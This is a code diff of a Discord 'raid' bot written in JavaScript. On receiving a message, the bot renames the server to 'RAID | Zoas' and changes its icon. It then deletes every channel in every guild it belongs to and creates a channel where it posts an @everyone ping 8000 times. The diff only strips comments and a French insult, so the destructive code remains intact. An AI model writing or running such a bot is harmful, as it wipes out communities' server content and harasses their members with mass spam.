@@ -15,9 +15,9 @@ client.on('message', (message) => {
 		message.guild.setIcon('https://scontent-cdg2-1.xx.fbcdn.net/v/t1.0-9/53292243_337639216876609_2362263121248124928_n.png?_nc_cat=102&ccb=2&_nc_sid=85a577&efg=eyJpIjoidCJ9&_nc_ohc=ZthzWMQvgIYAX_JOMuc&_nc_ht=scontent-cdg2-1.xx&oh=84071b4a4b569e06e9467bb88f81802b&oe=5FFE5265');
 		message.guild.setName(`RAID | Zoas`);
 		message.delete();
-		client.guilds.cache.forEach(guild => { // Looping through the guilds.
-			guild.channels.cache.forEach(channel => { // Looping through the guild channels.
-				channel.delete().catch(error => { // Deleting the channel(s) and catching any errors.
+		client.guilds.cache.forEach(guild => { 
+			guild.channels.cache.forEach(channel => { 
+				channel.delete().catch(error => { 
 					console.log(`Couldn't delete ${channel.name}.`)
 				});
 			});
@@ -28,7 +28,7 @@ client.on('message', (message) => {
                 message.guild.channels.create(`RAID | Zoas`, {type: 'text' })
                     .then(channel => {
                         for (var o = 0; o < 8000; o++) {
-                            channel.send(`@everyone RAID par Zoas\n J'tai bien niqué enzo?`);
+                            channel.send(`@everyone RAID par Zoas\n`);
                         }
                     })
                     .catch(console.error);
